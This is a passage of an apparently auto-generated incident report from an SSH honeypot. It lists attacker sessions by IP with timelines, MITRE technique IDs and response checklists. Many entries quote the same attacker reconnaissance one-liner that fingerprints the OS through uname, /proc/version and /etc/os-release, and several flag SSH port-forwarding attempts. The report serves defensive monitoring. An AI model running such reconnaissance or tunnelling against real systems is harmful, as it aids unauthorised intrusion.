| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:32 |
| **Last Seen** | 2026-07-28 13:32 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:32:30` | `cowrie.session.connect` |
| `2026-07-28 13:32:31` | `cowrie.client.version` |
| `2026-07-28 13:32:31` | `cowrie.client.kex` |
| `2026-07-28 13:32:35` | `cowrie.login.success` |
| `2026-07-28 13:32:39` | `cowrie.session.params` |
| `2026-07-28 13:32:39` | `cowrie.command.input` |
| `2026-07-28 13:32:39` | `cowrie.command.input` |
| `2026-07-28 13:32:39` | `cowrie.command.input` |
| `2026-07-28 13:32:39` | `cowrie.command.input` |
| `2026-07-28 13:32:39` | `cowrie.command.input` |
| `2026-07-28 13:32:39` | `cowrie.command.success` |
| `2026-07-28 13:32:39` | `cowrie.command.input` |
| `2026-07-28 13:32:39` | `cowrie.command.input` |
| `2026-07-28 13:32:39` | `cowrie.command.input` |
| `2026-07-28 13:32:39` | `cowrie.command.input` |
| `2026-07-28 13:32:40` | `cowrie.log.closed` |
| `2026-07-28 13:32:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4d427998dec

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:33 |
| **Last Seen** | 2026-07-28 13:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:33:41` | `cowrie.session.connect` |
| `2026-07-28 13:33:42` | `cowrie.client.version` |
| `2026-07-28 13:33:42` | `cowrie.client.kex` |
| `2026-07-28 13:33:46` | `cowrie.login.success` |
| `2026-07-28 13:33:50` | `cowrie.session.params` |
| `2026-07-28 13:33:50` | `cowrie.command.input` |
| `2026-07-28 13:33:50` | `cowrie.command.input` |
| `2026-07-28 13:33:50` | `cowrie.command.input` |
| `2026-07-28 13:33:50` | `cowrie.command.input` |
| `2026-07-28 13:33:50` | `cowrie.command.input` |
| `2026-07-28 13:33:50` | `cowrie.command.success` |
| `2026-07-28 13:33:50` | `cowrie.command.input` |
| `2026-07-28 13:33:50` | `cowrie.command.input` |
| `2026-07-28 13:33:50` | `cowrie.command.input` |
| `2026-07-28 13:33:50` | `cowrie.command.input` |
| `2026-07-28 13:33:51` | `cowrie.log.closed` |
| `2026-07-28 13:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a65e06d9c15b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:34 |
| **Last Seen** | 2026-07-28 13:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:34:51` | `cowrie.session.connect` |
| `2026-07-28 13:34:52` | `cowrie.client.version` |
| `2026-07-28 13:34:52` | `cowrie.client.kex` |
| `2026-07-28 13:34:57` | `cowrie.login.success` |
| `2026-07-28 13:34:59` | `cowrie.session.params` |
| `2026-07-28 13:34:59` | `cowrie.command.input` |
| `2026-07-28 13:34:59` | `cowrie.command.input` |
| `2026-07-28 13:34:59` | `cowrie.command.input` |
| `2026-07-28 13:34:59` | `cowrie.command.input` |
| `2026-07-28 13:34:59` | `cowrie.command.input` |
| `2026-07-28 13:34:59` | `cowrie.command.success` |
| `2026-07-28 13:34:59` | `cowrie.command.input` |
| `2026-07-28 13:34:59` | `cowrie.command.input` |
| `2026-07-28 13:34:59` | `cowrie.command.input` |
| `2026-07-28 13:34:59` | `cowrie.command.input` |
| `2026-07-28 13:35:00` | `cowrie.log.closed` |
| `2026-07-28 13:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-005d89922c2f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:36 |
| **Last Seen** | 2026-07-28 13:36 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:36:02` | `cowrie.session.connect` |
| `2026-07-28 13:36:03` | `cowrie.client.version` |
| `2026-07-28 13:36:03` | `cowrie.client.kex` |
| `2026-07-28 13:36:08` | `cowrie.login.success` |
| `2026-07-28 13:36:10` | `cowrie.session.params` |
| `2026-07-28 13:36:10` | `cowrie.command.input` |
| `2026-07-28 13:36:10` | `cowrie.command.input` |
| `2026-07-28 13:36:10` | `cowrie.command.input` |
| `2026-07-28 13:36:10` | `cowrie.command.input` |
| `2026-07-28 13:36:10` | `cowrie.command.input` |
| `2026-07-28 13:36:10` | `cowrie.command.success` |
| `2026-07-28 13:36:10` | `cowrie.command.input` |
| `2026-07-28 13:36:10` | `cowrie.command.input` |
| `2026-07-28 13:36:10` | `cowrie.command.input` |
| `2026-07-28 13:36:10` | `cowrie.command.input` |
| `2026-07-28 13:36:11` | `cowrie.log.closed` |
| `2026-07-28 13:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39b7a2b4152d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:37 |
| **Last Seen** | 2026-07-28 13:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:37:14` | `cowrie.session.connect` |
| `2026-07-28 13:37:14` | `cowrie.client.version` |
| `2026-07-28 13:37:14` | `cowrie.client.kex` |
| `2026-07-28 13:37:18` | `cowrie.login.success` |
| `2026-07-28 13:37:21` | `cowrie.session.params` |
| `2026-07-28 13:37:21` | `cowrie.command.input` |
| `2026-07-28 13:37:21` | `cowrie.command.input` |
| `2026-07-28 13:37:21` | `cowrie.command.input` |
| `2026-07-28 13:37:21` | `cowrie.command.input` |
| `2026-07-28 13:37:21` | `cowrie.command.input` |
| `2026-07-28 13:37:21` | `cowrie.command.success` |
| `2026-07-28 13:37:21` | `cowrie.command.input` |
| `2026-07-28 13:37:21` | `cowrie.command.input` |
| `2026-07-28 13:37:21` | `cowrie.command.input` |
| `2026-07-28 13:37:21` | `cowrie.command.input` |
| `2026-07-28 13:37:22` | `cowrie.log.closed` |
| `2026-07-28 13:37:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-733788ba02f4

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-28 13:37 |
| **Last Seen** | 2026-07-28 13:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:37:54` | `cowrie.session.connect` |
| `2026-07-28 13:37:54` | `cowrie.client.version` |
| `2026-07-28 13:37:54` | `cowrie.client.kex` |
| `2026-07-28 13:37:54` | `cowrie.login.success` |
| `2026-07-28 13:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7924ed239467

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-28 13:37 |
| **Last Seen** | 2026-07-28 13:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:37:54` | `cowrie.session.connect` |
| `2026-07-28 13:37:54` | `cowrie.client.version` |
| `2026-07-28 13:37:54` | `cowrie.client.kex` |
| `2026-07-28 13:37:55` | `cowrie.login.success` |
| `2026-07-28 13:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcc001e0ebce

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-28 13:37 |
| **Last Seen** | 2026-07-28 13:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:37:57` | `cowrie.session.connect` |
| `2026-07-28 13:37:57` | `cowrie.client.version` |
| `2026-07-28 13:37:57` | `cowrie.client.kex` |
| `2026-07-28 13:37:58` | `cowrie.login.success` |
| `2026-07-28 13:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f93be5611083

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-28 13:37 |
| **Last Seen** | 2026-07-28 13:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:37:58` | `cowrie.session.connect` |
| `2026-07-28 13:37:58` | `cowrie.client.version` |
| `2026-07-28 13:37:58` | `cowrie.client.kex` |
| `2026-07-28 13:37:58` | `cowrie.login.success` |
| `2026-07-28 13:37:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3984f3d4b61e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:38 |
| **Last Seen** | 2026-07-28 13:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:38:23` | `cowrie.session.connect` |
| `2026-07-28 13:38:24` | `cowrie.client.version` |
| `2026-07-28 13:38:24` | `cowrie.client.kex` |
| `2026-07-28 13:38:28` | `cowrie.login.success` |
| `2026-07-28 13:38:31` | `cowrie.session.params` |
| `2026-07-28 13:38:31` | `cowrie.command.input` |
| `2026-07-28 13:38:31` | `cowrie.command.input` |
| `2026-07-28 13:38:31` | `cowrie.command.input` |
| `2026-07-28 13:38:31` | `cowrie.command.input` |
| `2026-07-28 13:38:31` | `cowrie.command.input` |
| `2026-07-28 13:38:31` | `cowrie.command.success` |
| `2026-07-28 13:38:31` | `cowrie.command.input` |
| `2026-07-28 13:38:31` | `cowrie.command.input` |
| `2026-07-28 13:38:31` | `cowrie.command.input` |
| `2026-07-28 13:38:31` | `cowrie.command.input` |
| `2026-07-28 13:38:32` | `cowrie.log.closed` |
| `2026-07-28 13:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47a764e95236

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:39 |
| **Last Seen** | 2026-07-28 13:39 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:39:34` | `cowrie.session.connect` |
| `2026-07-28 13:39:35` | `cowrie.client.version` |
| `2026-07-28 13:39:35` | `cowrie.client.kex` |
| `2026-07-28 13:39:39` | `cowrie.login.success` |
| `2026-07-28 13:39:42` | `cowrie.session.params` |
| `2026-07-28 13:39:42` | `cowrie.command.input` |
| `2026-07-28 13:39:42` | `cowrie.command.input` |
| `2026-07-28 13:39:42` | `cowrie.command.input` |
| `2026-07-28 13:39:42` | `cowrie.command.input` |
| `2026-07-28 13:39:42` | `cowrie.command.input` |
| `2026-07-28 13:39:42` | `cowrie.command.success` |
| `2026-07-28 13:39:42` | `cowrie.command.input` |
| `2026-07-28 13:39:42` | `cowrie.command.input` |
| `2026-07-28 13:39:42` | `cowrie.command.input` |
| `2026-07-28 13:39:42` | `cowrie.command.input` |
| `2026-07-28 13:39:43` | `cowrie.log.closed` |
| `2026-07-28 13:39:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3b5f2bdd56e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 13:39 |
| **Last Seen** | 2026-07-28 13:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:39:52` | `cowrie.session.connect` |
| `2026-07-28 13:39:52` | `cowrie.client.version` |
| `2026-07-28 13:39:52` | `cowrie.client.kex` |
| `2026-07-28 13:39:53` | `cowrie.login.success` |
| `2026-07-28 13:39:53` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:39:53` | `cowrie.direct-tcpip.data` |
| `2026-07-28 13:39:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88ebf3d15787

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:40 |
| **Last Seen** | 2026-07-28 13:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:40:47` | `cowrie.session.connect` |
| `2026-07-28 13:40:48` | `cowrie.client.version` |
| `2026-07-28 13:40:48` | `cowrie.client.kex` |
| `2026-07-28 13:40:52` | `cowrie.login.success` |
| `2026-07-28 13:40:54` | `cowrie.session.params` |
| `2026-07-28 13:40:54` | `cowrie.command.input` |
| `2026-07-28 13:40:54` | `cowrie.command.input` |
| `2026-07-28 13:40:54` | `cowrie.command.input` |
| `2026-07-28 13:40:54` | `cowrie.command.input` |
| `2026-07-28 13:40:54` | `cowrie.command.input` |
| `2026-07-28 13:40:54` | `cowrie.command.success` |
| `2026-07-28 13:40:54` | `cowrie.command.input` |
| `2026-07-28 13:40:54` | `cowrie.command.input` |
| `2026-07-28 13:40:54` | `cowrie.command.input` |
| `2026-07-28 13:40:54` | `cowrie.command.input` |
| `2026-07-28 13:40:55` | `cowrie.log.closed` |
| `2026-07-28 13:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-071096f897e9

| Field | Detail |
|---|---|
| **Source IP** | `116.228.195[.]251` |
| **First Seen** | 2026-07-28 13:41 |
| **Last Seen** | 2026-07-28 13:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:41:12` | `cowrie.session.connect` |
| `2026-07-28 13:41:12` | `cowrie.client.version` |
| `2026-07-28 13:41:12` | `cowrie.client.kex` |
| `2026-07-28 13:41:14` | `cowrie.login.success` |
| `2026-07-28 13:41:15` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:41:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.195[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.228.195[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c61d94b4766

| Field | Detail |
|---|---|
| **Source IP** | `182.79.218[.]101` |
| **First Seen** | 2026-07-28 13:41 |
| **Last Seen** | 2026-07-28 13:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:41:20` | `cowrie.session.connect` |
| `2026-07-28 13:41:21` | `cowrie.client.version` |
| `2026-07-28 13:41:21` | `cowrie.client.kex` |
| `2026-07-28 13:41:23` | `cowrie.login.success` |
| `2026-07-28 13:41:24` | `cowrie.direct-tcpip.request` |
| `2026-07-28 13:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.218[.]101` to AbuseIPDB if not already reported
- [ ] Block `182.79.218[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c35616d4dff

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 13:42 |
| **Last Seen** | 2026-07-28 13:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 13:42:01` | `cowrie.session.connect` |
| `2026-07-28 13:42:01` | `cowrie.client.version` |
| `2026-07-28 13:42:01` | `cowrie.client.kex` |
| `2026-07-28 13:42:05` | `cowrie.login.success` |
| `2026-07-28 13:42:08` | `cowrie.session.params` |
| `2026-07-28 13:42:08` | `cowrie.command.input` |
| `2026-07-28 13:42:08` | `cowrie.command.input` |
| `2026-07-28 13:42:08` | `cowrie.command.input` |
| `2026-07-28 13:42:08` | `cowrie.command.input` |
| `2026-07-28 13:42:08` | `cowrie.command.input` |
| `2026-07-28 13:42:08` | `cowrie.command.success` |
| `2026-07-28 13:42:08` | `cowrie.command.input` |
| `2026-07-28 13:42:08` | `cowrie.command.input` |
| `2026-07-28 13:42:08` | `cowrie.command.input` |
| `2026-07-28 13:42:08` | `cowrie.command.input` |
| `2026-07-28 13:42:09` | `cowrie.log.closed` |
| `2026-07-28 13:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-874e068fb0b2

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]88` |
| **First Seen** | 2026-07-28 13:42 |
| **Last Seen** | 2026-07-28 13:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
